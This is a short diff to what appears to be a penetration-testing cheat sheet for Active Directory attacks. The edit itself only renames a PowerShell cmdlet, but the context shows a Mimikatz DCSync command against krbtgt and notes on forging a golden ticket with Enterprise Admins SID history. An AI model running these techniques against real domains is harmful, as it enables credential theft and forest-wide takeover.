@@ -1525,7 +1525,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername
 
 #### Create TGT and inject in current session
 - The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
-- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
+- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
 - Also possible to use the <DOMAIN SID>-519 (519 is the enterprise admin group)
 - Remove ```/ptt``` to save ticket to file
 ```
